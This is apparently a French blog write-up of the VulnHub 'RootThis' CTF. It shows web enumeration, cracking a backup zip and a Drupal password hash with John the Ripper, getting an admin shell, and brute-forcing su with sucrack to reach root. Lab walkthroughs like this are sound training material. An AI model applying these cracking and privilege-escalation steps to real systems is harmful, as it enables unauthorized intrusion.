---
title: "Solution du CTF RootThis de VulnHub"
tags: [CTF,VulnHub]
---

[RootThis](https://vulnhub.com/entry/rootthis-1,272/) est un CTF créé par *Fred Wemeijer* et proposé sur *VulnHub*.

On ne trouve sur la VM rien de plus que le port 80. Une énumération avec `feroxbuster` retourne un Drupal et un dossier `backup` :

```console
$ feroxbuster -u http://192.168.56.207/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -x php,html,zip,txt -W 32

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.207/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💢  Word Count Filter     │ 32
 💲  Extensions            │ [php, html, zip, txt]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      368l      933w    10701c http://192.168.56.207/index.html
200     1092l     6216w   270103c http://192.168.56.207/backup
200      368l      933w    10701c http://192.168.56.207/
301        9l       28w      317c http://192.168.56.207/manual
301        9l       28w      317c http://192.168.56.207/drupal
[####################] - 1m    598005/598005  0s      found:5       errors:0      
[####################] - 1m    598005/598005  5569/s  http://192.168.56.207/
```

Accéder à `/backup` nous fait télécharger un fichier `backup.zip`. L'archive est protégée par mot de passe. Il faut générer un hash puis le casser avec `JtR` :

```console
$ zip2john backup.zip > hashes.txt
$ john --wordlist=wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
thebackup        (backup.zip/dump.sql)     
1g 0:00:00:00 DONE (2023-05-17 16:57) 2.325g/s 7601Kp/s 7601Kc/s 7601KC/s thebiker1..thanaye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

On peut alors lire le dump SQL. Je recherche toutes les occurrences de `INSERT` jusqu'à trouver celle qui m'intéresse :

```sql
INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),
  (1,'webman','$S$D48VBXSv5S.xSEjmLOyEPUL.okqerljl.gR6X7q0nyYAvymhZ4VN','webman@localhost.net','','',NULL,1543758615,1543767021,1543767021,1,'Europe/Berlin','',0,'webman@localhost.net','b:0;')
```

Une fois de plus je passe le hash à `JtR` qui trouve le password correspondant : `moranguita`.

Avec le compte `webman` je peux accéder à l'interface d'administration du Drupal.

Obtenir un shell sur ce CMS est un peu compliqué : il faut activer le format PHP, créer un block utilisant le format et autoriser le compte administrateur dessus. J'ai décrit la procédure dans la solution du [CTF DC: 1]({% link _posts/2023-03-20-Solution-du-CTF-DC-1-de-VulnHub.md %}).

Avec mon shell, en fouillant dans le système, je trouve un message à l'attention de `root` :

```console
www-data@RootThis:/home/user$ cat MessageToRoot.txt 
Hi root,

Your password for this machine is weak and within the first 300 words of the rockyou.txt wordlist. Fortunately root is not accessible via ssh. Please update the password to a more secure one.

Regards,
user
```

Effectivement SSH n'est pas lancé sur le système. L'idée est donc de brute-forcer `su` ce que je n'ai jamais fait jusqu'à présent.

J'ai d'abord essayé avec [GitHub - carlospolop/su-bruteforce](https://github.com/carlospolop/su-bruteforce) qui est mentionné sur la page [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#su-brute).

Le script n'avait pas l'air de tourner correctement, je ne voyais aucune instance de `su` tourner en fond.

J'ai donc dû me tourner vers [GitHub - hemp3l/sucrack: brute-forcing su for fun and possibly profit](https://github.com/hemp3l/sucrack) qui requiert d'être compilé. C'est là que ça se complique, car `gcc` n'est pas sur la VM.

J'ai tenté de le compiler sur mon système, mais comme ce dernier est bien plus récent et que j'avais des erreurs j'ai préféré abandonner.

Finalement j'avais une VM de *Debian Jessie* sous le coude. C'est une version Debian 8 (contre Debian 9) et la compilation échouait aussi, mais en changeant les versions de `aclocal` et `automake` de 1.15 à 1.14 dans le `Makefile` c'est passé.

```console
www-data@RootThis:/tmp$ SUCRACK_SU_PATH=/bin/su ./sucrack -u root rockyou.txt 
password is: 789456123
www-data@RootThis:/tmp$ su
Password: 
root@RootThis:/tmp# cd /root/
root@RootThis:~# ls
flag.txt
root@RootThis:~# cat flag.txt 
Congratulations!

flag: a67d764105005a6a95a9c8c03bc95710bc396dccc4364704127170637b2bd39d
```
